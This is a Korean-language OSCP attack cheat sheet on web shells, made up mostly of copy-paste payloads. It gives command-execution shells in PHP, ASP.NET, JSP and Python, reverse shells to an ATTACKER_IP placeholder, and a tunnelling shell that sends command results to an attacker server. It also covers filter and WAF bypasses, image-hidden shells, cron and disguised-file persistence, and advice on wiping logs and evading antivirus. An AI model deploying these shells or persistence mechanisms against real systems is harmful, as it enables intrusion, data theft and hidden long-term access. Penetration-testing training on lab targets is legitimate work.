# Web Shells - OSCP 공격 가이드

> **목표: 웹쉘을 통한 시스템 제어 → 리버스쉘 업그레이드 → 완전한 시스템 접근**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🐘 PHP 웹쉘

```php
# 기본 PHP 웹쉘 (GET 방식)
<?php system($_GET['cmd']); ?>

# 더 안전한 PHP 웹쉘
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
?>

# POST 방식 PHP 웹쉘
<?php
if(isset($_POST['cmd'])){
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}
?>
<form method="POST">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>

# 멀티 기능 PHP 웹쉘
<?php
$cmd = $_REQUEST['cmd'];
$upload = $_FILES['upload'];

if($cmd) {
    echo "<pre>";
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('passthru')) {
        passthru($cmd);
    }
    echo "</pre>";
}

if($upload) {
    move_uploaded_file($upload['tmp_name'], $upload['name']);
    echo "File uploaded: " . $upload['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
Command: <input type="text" name="cmd"><br>
Upload: <input type="file" name="upload"><br>
<input type="submit" value="Execute">
</form>

# PHP 백도어 (eval 기반)
<?php eval($_POST['cmd']); ?>

# PHP 원라이너들
<?php `$_GET[0]`; ?>
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo system($_REQUEST['cmd']); ?>
<?php $c=$_GET['c'];if($c){echo`$c`;} ?>

# PHP 파일 매니저
<?php
if($_GET['f']) {
    if($_GET['a'] == 'read') {
        echo "<pre>".htmlspecialchars(file_get_contents($_GET['f']))."</pre>";
    } elseif($_GET['a'] == 'write') {
        file_put_contents($_GET['f'], $_POST['data']);
        echo "File written!";
    } elseif($_GET['a'] == 'delete') {
        unlink($_GET['f']);
        echo "File deleted!";
    }
} else {
    echo "<pre>";
    print_r(scandir('.'));
    echo "</pre>";
}
?>
```

### 🪟 ASP.NET 웹쉘

```asp
# 클래식 ASP 웹쉘
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.write("<pre>")
    Response.write(oExec.StdOut.ReadAll)
    Response.write("</pre>")
End If
%>
<form>
<input type="text" name="cmd" size="45" value="<%= szCMD %>">
<input type="submit" value="Run">
</form>

# ASPX 웹쉘 (C#)
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e) {
    string ExcuteThis = Request.Form["cmd"];
    if (ExcuteThis != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + ExcuteThis;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
<form runat="server">
<asp:TextBox id="cmd" runat="server" Width="300px"></asp:TextBox>
<asp:Button Text="Run" OnClick="Page_Load" runat="server"></asp:Button>
</form>

# ASPX 원라이너
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>

# ASPX 파일 업로드 웹쉘
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request.Files.Count > 0) {
        Request.Files[0].SaveAs(Server.MapPath(Request.Files[0].FileName));
        Response.Write("File uploaded: " + Request.Files[0].FileName);
    }
    if (Request.Form["cmd"] != null) {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.Form["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<form method="post" enctype="multipart/form-data">
Command: <input type="text" name="cmd"><br>
Upload: <input type="file" name="file"><br>
<input type="submit" value="Submit">
</form>
```

### ☕ JSP 웹쉘

```jsp
# 기본 JSP 웹쉘
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
<form>
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>

# 고급 JSP 웹쉘
<%@ page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*" %>
<%
String cmd = request.getParameter("cmd");
String upload = request.getParameter("upload");

if (cmd != null && !cmd.equals("")) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line = null;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
}

if (upload != null) {
    // 파일 업로드 기능 구현
}
%>
<form method="GET">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>

# JSP 원라이너
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>

# JSP 리버스 쉘
<%@ page import="java.io.*,java.net.*" %>
<%
String host = "ATTACKER_IP";
int port = 443;
String cmd = "cmd.exe";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while(!s.isClosed()) {
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;} catch (Exception e){}
}
p.destroy();s.close();
%>
```

### 🐍 Python CGI 웹쉘

```python
#!/usr/bin/env python
import cgi, os, sys

print("Content-Type: text/html\n")

form = cgi.FieldStorage()
cmd = form.getvalue('cmd')

print("""
<html><body>
<form method="GET">
Command: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
<pre>
""")

if cmd:
    os.system(cmd)

print("</pre></body></html>")

# Python 고급 웹쉘
#!/usr/bin/env python3
import cgi, os, sys, subprocess
import cgitb
cgitb.enable()

print("Content-Type: text/html\n")

form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
upload = form.getvalue('upload')

if cmd:
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(f"<pre>{result.stdout}\n{result.stderr}</pre>")
    except Exception as e:
        print(f"Error: {e}")

if upload:
    # 파일 업로드 처리
    pass

print("""
<form method="POST" enctype="multipart/form-data">
Command: <input type="text" name="cmd"><br>
Upload: <input type="file" name="upload"><br>
<input type="submit" value="Submit">
</form>
""")
```

## 🎯 상황별 페이로드

### 🔥 리버스 쉘 업그레이드

```php
# PHP에서 리버스 쉘로 업그레이드
<?php
if($_GET['rev']) {
    $ip = $_GET['ip'] ? $_GET['ip'] : 'ATTACKER_IP';
    $port = $_GET['port'] ? $_GET['port'] : '443';

    // Bash 리버스 쉘
    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";

    // 백그라운드 실행
    shell_exec("nohup $cmd > /dev/null 2>&1 &");
    echo "Reverse shell initiated to $ip:$port";
}
?>

# Python CGI 리버스 쉘
#!/usr/bin/env python
import socket,subprocess,os
if os.environ.get('HTTP_X_REVERSE'):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("ATTACKER_IP",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

# ASPX 리버스 쉘
<%@ Page Language="C#" %>
<%
if (Request.Headers["X-Reverse"] != null) {
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "powershell.exe";
    p.StartInfo.Arguments = "-nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
    p.StartInfo.UseShellExecute = false;
    p.Start();
}
%>
```

### 📁 파일 관리 웹쉘

```php
# PHP 파일 매니저
<?php
$action = $_GET['action'];
$file = $_GET['file'];
$dir = $_GET['dir'] ? $_GET['dir'] : getcwd();

switch($action) {
    case 'list':
        echo "<h3>Directory: $dir</h3>";
        $files = scandir($dir);
        foreach($files as $f) {
            $path = "$dir/$f";
            if(is_dir($path)) {
                echo "[DIR] <a href='?action=list&dir=$path'>$f</a><br>";
            } else {
                echo "[FILE] <a href='?action=read&file=$path'>$f</a> ";
                echo "(<a href='?action=download&file=$path'>download</a>) ";
                echo "(<a href='?action=delete&file=$path'>delete</a>)<br>";
            }
        }
        break;

    case 'read':
        echo "<h3>File: $file</h3>";
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
        break;

    case 'write':
        if($_POST['content']) {
            file_put_contents($file, $_POST['content']);
            echo "File written successfully!";
        }
        echo "<form method='POST'>";
        echo "<textarea name='content' rows='20' cols='80'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>";
        echo "<input type='submit' value='Save'>";
        echo "</form>";
        break;

    case 'upload':
        if($_FILES['upload']) {
            $target = $dir . '/' . $_FILES['upload']['name'];
            move_uploaded_file($_FILES['upload']['tmp_name'], $target);
            echo "File uploaded: $target";
        }
        echo "<form method='POST' enctype='multipart/form-data'>";
        echo "<input type='file' name='upload'>";
        echo "<input type='submit' value='Upload'>";
        echo "</form>";
        break;

    case 'download':
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;

    case 'delete':
        unlink($file);
        echo "File deleted: $file";
        break;

    default:
        echo "<a href='?action=list'>File Manager</a> | ";
        echo "<a href='?action=upload'>Upload</a> | ";
        echo "<a href='?cmd='>Command Shell</a>";
}

// 명령어 실행 기능
if($_GET['cmd'] !== null) {
    echo "<form>";
    echo "<input type='text' name='cmd' value='" . htmlspecialchars($_GET['cmd']) . "' size='50'>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";

    if($_GET['cmd']) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    }
}
?>
```

### 🔐 인증 기능 웹쉘

```php
# 패스워드 보호된 PHP 웹쉘
<?php
session_start();
$password = "admin123";

if($_POST['password'] == $password) {
    $_SESSION['authenticated'] = true;
}

if($_GET['logout']) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if(!$_SESSION['authenticated']) {
    echo '<form method="POST">';
    echo 'Password: <input type="password" name="password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

// 인증된 사용자만 접근 가능한 웹쉘 기능
echo '<a href="?logout=1">Logout</a><br>';

if($_GET['cmd']) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
<form>
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>

# 고급 인증 웹쉘 (IP 제한 + 패스워드)
<?php
$allowed_ips = array('ATTACKER_IP', '127.0.0.1');
$password = md5('secretpass');

if(!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    http_response_code(404);
    exit;
}

if($_POST['auth'] != $password) {
    echo '<form method="POST">';
    echo '<input type="password" name="auth">';
    echo '<input type="submit" value="Access">';
    echo '</form>';
    exit;
}

// 웹쉘 기능
?>
```

### 🌐 HTTP 터널링 웹쉘

```php
# HTTP 터널링 웹쉘 (공격자 서버와 통신)
<?php
$tunnel_url = "http://ATTACKER_IP:8080/tunnel";

if($_POST['cmd']) {
    $cmd = $_POST['cmd'];
    $result = shell_exec($cmd);

    // 결과를 공격자 서버로 전송
    $data = array(
        'hostname' => gethostname(),
        'ip' => $_SERVER['SERVER_ADDR'],
        'cmd' => $cmd,
        'result' => base64_encode($result)
    );

    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    file_get_contents($tunnel_url, false, $context);

    echo "<pre>$result</pre>";
}

// 주기적으로 공격자 서버에서 명령어 체크
if($_GET['check']) {
    $cmd_url = "http://ATTACKER_IP:8080/cmd?id=" . md5($_SERVER['SERVER_NAME']);
    $cmd = file_get_contents($cmd_url);
    if($cmd && $cmd != 'none') {
        $result = shell_exec($cmd);
        echo $result;
    }
}
?>
<form method="POST">
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>
<script>
// 주기적으로 명령어 체크 (백그라운드)
setInterval(function() {
    fetch('?check=1').then(r => r.text()).then(data => {
        if(data.trim()) console.log(data);
    });
}, 10000);
</script>
```

## 🔄 우회 기법들

### 🏷️ 확장자 필터 우회

```php
# 다양한 PHP 확장자
shell.php
shell.php3
shell.php4
shell.php5
shell.phtml
shell.pht
shell.phps
shell.php.jpg
shell.php%00.jpg

# .htaccess를 이용한 확장자 활성화
# .htaccess 파일 내용:
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt

# 이미지 헤더 + PHP 코드
GIF89a
<?php system($_GET['cmd']); ?>

# 다중 확장자
shell.php.gif
shell.asp.jpg
shell.jsp.png
```

### 🔤 키워드 필터 우회

```php
# system 함수 우회
<?php $_GET[0]($_GET[1]); ?>
# 사용: ?0=system&1=whoami

# eval 기반 우회
<?php eval($_POST[0]); ?>
# POST: 0=system('whoami');

# 문자열 연결 우회
<?php $a='sys'.'tem'; $a($_GET['cmd']); ?>

# Base64 우회
<?php eval(base64_decode($_POST['data'])); ?>
# POST: data=c3lzdGVtKCR7JEdFVFsnY21kJ119KTs=

# 함수 변수 우회
<?php $f = $_GET['f']; $f($_GET['cmd']); ?>
# 사용: ?f=system&cmd=whoami

# ASCII 값 우회
<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET['cmd']); ?>

# 역따옴표 우회
<?php echo `$_GET[cmd]`; ?>

# 다양한 실행 함수들
<?php
$functions = array('system', 'shell_exec', 'exec', 'passthru', 'popen', 'proc_open');
foreach($functions as $func) {
    if(function_exists($func)) {
        $func($_GET['cmd']);
        break;
    }
}
?>
```

### 🚫 WAF 우회

```php
# User-Agent 기반 필터링 우회
<?php
if(strpos($_SERVER['HTTP_USER_AGENT'], 'CUSTOM_UA') !== false) {
    system($_GET['cmd']);
}
?>

# Referer 기반 우회
<?php
if($_SERVER['HTTP_REFERER'] == 'http://ATTACKER_DOMAIN/') {
    system($_GET['cmd']);
}
?>

# 쿠키 기반 우회
<?php
if($_COOKIE['auth'] == 'SECRETKEY') {
    system($_GET['cmd']);
}
?>

# HTTP 헤더 기반 우회
<?php
if($_SERVER['HTTP_X_FORWARDED_FOR'] == 'ATTACKER_IP') {
    system($_GET['cmd']);
}
?>

# POST vs GET 우회
<?php
// GET이 막혔을 때 POST 사용
if($_POST['cmd']) {
    system($_POST['cmd']);
}
?>

# JSON 데이터 우회
<?php
$json = json_decode(file_get_contents('php://input'), true);
if($json['cmd']) {
    system($json['cmd']);
}
?>

# Base64 URL 파라미터 우회
<?php
$cmd = base64_decode($_GET['data']);
if($cmd) {
    system($cmd);
}
?>
```

### 🎭 스테가노그래피 웹쉘

```php
# 이미지 파일에 웹쉘 숨기기
# 1. 정상 이미지 파일 준비
# 2. 이미지 끝에 PHP 코드 추가

# 예시: image.jpg
FFD8FFE0...  [JPEG 데이터] ... FFD9
<?php system($_GET['cmd']); ?>

# .htaccess 설정으로 이미지를 PHP로 처리
AddType application/x-httpd-php .jpg

# 주석 속에 숨긴 웹쉘
<!--
<?php system($_GET['cmd']); ?>
-->

# CSS 스타일 속에 숨긴 웹쉘
<style>
/* <?php system($_GET['cmd']); ?> */
body { color: red; }
</style>

# JavaScript 주석 속 웹쉘
<script>
// <?php system($_GET['cmd']); ?>
console.log('normal page');
</script>
```

## 🤖 자동화 도구 명령어

### 🔧 웹쉘 생성 자동화

```bash
# Weevely - 스테가노그래피 PHP 웹쉘
weevely generate mypassword /tmp/shell.php
weevely http://target.com/shell.php mypassword

# 기능들:
weevely> :help
weevely> file_upload /tmp/file.txt /var/www/html/
weevely> file_download /etc/passwd /tmp/
weevely> sql_console mysql://user:pass@localhost/db
weevely> reverse_tcp ATTACKER_IP 443

# China Chopper 스타일 원라이너 생성
echo '<?php @eval($_POST["cmd"]);?>' > chopper.php

# WSO (Web Shell Obfuscated) 스타일
curl -s https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php > wso.php
```

### 🔍 웹쉘 탐지 및 업로드

```bash
# Gobuster로 기존 웹쉘 탐지
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp

# 일반적인 웹쉘 이름들
shell.php
cmd.php
backdoor.php
c99.php
r57.php
wso.php
adminer.php
phpinfo.php
test.php
upload.php

# Burp Suite Intruder로 웹쉘 업로드 자동화
# 1. 파일 업로드 요청을 Intruder로 전송
# 2. 파일명과 Content-Type을 변수로 설정
# 3. 다양한 확장자와 MIME 타입 조합 테스트
```

### 🐍 웹쉘 자동 생성기

```python
#!/usr/bin/env python3
import sys
import base64

def generate_webshells(password="admin"):
    shells = {
        "php_simple": '<?php system($_GET["cmd"]); ?>',
        "php_post": '<?php if($_POST["pass"]=="%s"){system($_POST["cmd"]);} ?>' % password,
        "php_eval": '<?php if($_POST["auth"]=="%s"){eval($_POST["code"]);} ?>' % password,
        "php_obfuscated": '<?php $p="%s";if($_POST["a"]==$p){$c=$_POST["c"];eval($c);} ?>' % password,
        "asp_simple": '<% execute request("cmd") %>',
        "aspx_simple": '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>',
        "jsp_simple": '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
        "python_cgi": '''#!/usr/bin/env python
import cgi, os
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd: os.system(cmd)
print("Content-Type: text/html\\n")
print("<form><input name='cmd'><input type='submit'></form>")'''
    }

    print("[+] Generated Web Shells:")
    print("="*50)

    for name, code in shells.items():
        filename = f"{name}.{'php' if 'php' in name else 'asp' if 'asp' in name else 'jsp' if 'jsp' in name else 'py'}"

        print(f"\n[{filename}]")
        print(code)

        # 파일로 저장
        with open(filename, 'w') as f:
            f.write(code)

        # Base64 인코딩 버전
        encoded = base64.b64encode(code.encode()).decode()
        print(f"\n[{filename} - BASE64]")
        print(f"echo '{encoded}' | base64 -d > {filename}")

if __name__ == "__main__":
    password = sys.argv[1] if len(sys.argv) > 1 else "admin"
    generate_webshells(password)
    print(f"\n[+] Use password: {password}")
```

### 🚀 웹쉘 관리 도구

```bash
#!/bin/bash
# 웹쉘 관리 스크립트

WEBSHELL_URL="$1"
PASSWORD="$2"

if [ $# -ne 2 ]; then
    echo "Usage: $0 <WEBSHELL_URL> <PASSWORD>"
    echo "Example: $0 http://target.com/shell.php mypass"
    exit 1
fi

function execute_command() {
    local cmd="$1"
    echo "[+] Executing: $cmd"

    # POST 방식
    curl -s -X POST -d "pass=$PASSWORD&cmd=$cmd" "$WEBSHELL_URL"

    # GET 방식
    # curl -s "$WEBSHELL_URL?pass=$PASSWORD&cmd=$(echo $cmd | sed 's/ /%20/g')"
}

function upload_file() {
    local file="$1"
    echo "[+] Uploading: $file"

    curl -X POST -F "pass=$PASSWORD" -F "upload=@$file" "$WEBSHELL_URL"
}

function interactive_shell() {
    echo "[+] Interactive web shell (type 'exit' to quit)"

    while true; do
        echo -n "webshell> "
        read cmd

        if [ "$cmd" = "exit" ]; then
            break
        fi

        execute_command "$cmd"
    done
}

function reverse_shell() {
    local ip="$1"
    local port="$2"

    echo "[+] Attempting reverse shell to $ip:$port"

    # Linux bash reverse shell
    local payload="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    execute_command "$payload"
}

# 메뉴
echo "Web Shell Manager"
echo "1. Execute command"
echo "2. Interactive shell"
echo "3. Upload file"
echo "4. Reverse shell"
echo "5. System info"

read -p "Choose option: " option

case $option in
    1)
        read -p "Command: " cmd
        execute_command "$cmd"
        ;;
    2)
        interactive_shell
        ;;
    3)
        read -p "File path: " file
        upload_file "$file"
        ;;
    4)
        read -p "IP: " ip
        read -p "Port: " port
        reverse_shell "$ip" "$port"
        ;;
    5)
        execute_command "whoami && id && pwd && uname -a"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
```

## 🚨 문제 해결

### ❌ 웹쉘이 실행되지 않을 때

```bash
# 1. 웹 서버 오류 로그 확인
tail -f /var/log/apache2/error.log
tail -f /var/log/nginx/error.log
tail -f /var/log/httpd/error_log

# 2. PHP 설정 확인
<?php phpinfo(); ?>

# 3. 실행 권한 확인
ls -la shell.php
chmod 644 shell.php

# 4. 웹 서버 설정 확인
# .htaccess가 허용되는지 확인
# PHP 실행이 허용되는지 확인

# 5. 다른 함수들 시도
<?php
$functions = array('system', 'shell_exec', 'exec', 'passthru', '`', 'popen', 'proc_open');
foreach($functions as $func) {
    if(function_exists($func)) {
        echo "$func: available<br>";
    } else {
        echo "$func: disabled<br>";
    }
}
?>

# 6. 안전 모드 확인
<?php
echo "Safe mode: " . (ini_get('safe_mode') ? 'On' : 'Off') . "<br>";
echo "Disable functions: " . ini_get('disable_functions') . "<br>";
?>
```

### 🔍 웹쉘을 찾을 수 없을 때

```bash
# 1. 일반적인 위치들 확인
/var/www/html/
/var/www/
/usr/share/nginx/html/
/home/user/public_html/
/inetpub/wwwroot/

# 2. 업로드 디렉토리 확인
/uploads/
/upload/
/files/
/media/
/assets/
/tmp/
/temp/

# 3. 웹 서버 Document Root 확인
<?php echo $_SERVER['DOCUMENT_ROOT']; ?>

# 4. 현재 디렉토리 확인
<?php echo getcwd(); ?>

# 5. 디렉토리 리스팅
<?php print_r(scandir('.')); ?>

# 6. 파일 검색
find /var/www -name "*.php" -exec grep -l "system\|exec\|shell_exec" {} \;
grep -r "<?php" /var/www/html/ | grep -E "(system|exec|shell_exec|eval)"
```

### 🚫 명령어가 실행되지 않을 때

```php
# 1. 다른 실행 함수들 시도
<?php
$cmd = $_GET['cmd'];
if(function_exists('system')) {
    system($cmd);
} elseif(function_exists('shell_exec')) {
    echo shell_exec($cmd);
} elseif(function_exists('exec')) {
    exec($cmd, $output);
    echo implode("\n", $output);
} elseif(function_exists('passthru')) {
    passthru($cmd);
} elseif(function_exists('popen')) {
    $handle = popen($cmd, 'r');
    echo fread($handle, 2096);
    pclose($handle);
} else {
    echo "No execution functions available";
}
?>

# 2. 프로그래밍 언어별 실행
<?php
// PHP
exec($cmd);

// Python
exec("python -c \"import os; os.system('$cmd')\"");

// Perl
exec("perl -e \"system('$cmd')\"");

// Ruby
exec("ruby -e \"system('$cmd')\"");
?>

# 3. 파일 기반 실행
<?php
file_put_contents('/tmp/cmd.sh', $_GET['cmd']);
chmod('/tmp/cmd.sh', 0755);
echo shell_exec('/tmp/cmd.sh');
unlink('/tmp/cmd.sh');
?>

# 4. 환경 변수 확인
<?php
echo "PATH: " . $_ENV['PATH'] . "<br>";
echo "USER: " . $_ENV['USER'] . "<br>";
echo "PWD: " . $_ENV['PWD'] . "<br>";
?>
```

### 🔄 웹쉘에서 리버스쉘로 업그레이드

```php
# 1. 백그라운드 리버스쉘
<?php
if($_GET['rev'] == '1') {
    $cmd = "nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' > /dev/null 2>&1 &";
    shell_exec($cmd);
    echo "Reverse shell initiated";
}
?>

# 2. Python 리버스쉘
<?php
if($_GET['py'] == '1') {
    $python_shell = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"';
    shell_exec("nohup $python_shell > /dev/null 2>&1 &");
    echo "Python reverse shell initiated";
}
?>

# 3. 파일 기반 지속성
<?php
if($_GET['persist'] == '1') {
    $shell_script = '#!/bin/bash\nwhile true; do\n    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\n    sleep 60\ndone';
    file_put_contents('/tmp/.system-update', $shell_script);
    chmod('/tmp/.system-update', 0755);
    shell_exec('nohup /tmp/.system-update > /dev/null 2>&1 &');
    echo "Persistent reverse shell installed";
}
?>

# 4. Cron 기반 지속성
<?php
if($_GET['cron'] == '1') {
    $cron_job = "*/5 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'";
    shell_exec("(crontab -l 2>/dev/null; echo '$cron_job') | crontab -");
    echo "Cron job installed";
}
?>
```

### 🎯 웹쉘 최적화

```php
# 멀티 기능 고급 웹쉘
<?php
error_reporting(0);
$password = "secretpass";

if($_POST['auth'] != md5($password)) {
    die('<form method="post">Auth: <input type="password" name="auth"><input type="submit"></form>');
}

$action = $_POST['action'];

switch($action) {
    case 'cmd':
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
        break;

    case 'upload':
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "Uploaded: " . $_FILES['file']['name'];
        break;

    case 'download':
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($_POST['file']) . '"');
        readfile($_POST['file']);
        exit;
        break;

    case 'reverse':
        $ip = $_POST['ip'];
        $port = $_POST['port'];
        shell_exec("nohup bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &");
        echo "Reverse shell to $ip:$port initiated";
        break;

    case 'info':
        echo "<pre>";
        echo "OS: " . php_uname() . "\n";
        echo "User: " . get_current_user() . "\n";
        echo "UID: " . getmyuid() . "\n";
        echo "GID: " . getmygid() . "\n";
        echo "PWD: " . getcwd() . "\n";
        echo "PHP: " . phpversion() . "\n";
        echo "</pre>";
        break;
}
?>

<form method="post" enctype="multipart/form-data">
Command: <input type="text" name="cmd"><input type="hidden" name="action" value="cmd"><br>
Upload: <input type="file" name="file"><input type="hidden" name="action" value="upload"><br>
Download: <input type="text" name="file" placeholder="File path"><input type="hidden" name="action" value="download"><br>
Reverse Shell: <input type="text" name="ip" placeholder="IP"> <input type="text" name="port" placeholder="Port"><input type="hidden" name="action" value="reverse"><br>
<input type="hidden" name="action" value="info"><input type="submit" value="System Info"><br>
<input type="submit" value="Execute">
</form>
```

## 📊 성공 판정 기준

### ✅ 웹쉘 업로드 성공

- **파일 존재**: 업로드된 웹쉘 파일이 웹 디렉토리에 존재
- **웹 접근**: 브라우저에서 웹쉘 URL 접근 시 정상 응답
- **명령 실행**: `whoami`, `id`, `pwd` 등 기본 명령어 실행 성공
- **권한 확인**: 웹 서버 사용자 권한으로 명령어 실행

### ✅ 웹쉘 기능 확인

- **파일 업로드/다운로드**: 파일 전송 기능 정상 동작
- **디렉토리 탐색**: 파일 시스템 탐색 가능
- **권한 상승**: sudo, SUID 파일 등을 통한 권한 상승 가능
- **네트워크 접근**: 외부 통신 및 내부 네트워크 접근

### ✅ 지속성 및 안정성

- **재부팅 생존**: 시스템 재부팅 후에도 웹쉘 접근 가능
- **로그 회피**: 웹 서버 로그에 의심스러운 흔적 최소화
- **탐지 회피**: AV, EDR 등 보안 솔루션 탐지 회피
- **다중 백도어**: 여러 웹쉘과 접근 방법 확보

### ⏰ 시간 관리

- **즉시 업로드**: 파일 업로드 취약점 발견 후 5분 내 웹쉘 설치
- **기능 확인**: 10분 내 모든 웹쉘 기능 테스트 완료
- **업그레이드**: 15분 내 리버스쉘로 업그레이드 또는 권한 상승
- **지속성**: 20분 내 백도어 및 지속성 메커니즘 구축

**활용 전략**: 웹쉘 → 리버스쉘 → 권한상승 → 지속성 확보 순서로 진행

## 💡 OSCP 실전 팁

- **다중 업로드**: 여러 위치, 여러 이름으로 웹쉘 업로드
- **기능 테스트**: 업로드 후 즉시 모든 기능 동작 확인
- **권한 파악**: 웹 서버 사용자 권한과 가능한 권한상승 방법 확인
- **리버스쉘 준비**: 웹쉘 안정화 후 즉시 리버스쉘로 업그레이드
- **로그 정리**: 웹 서버 로그에서 의심스러운 항목 제거
- **백업 계획**: 주 웹쉘 제거시 대비용 백업 웹쉘 준비
- **은닉 위치**: 깊은 디렉토리나 정상 파일명으로 위장
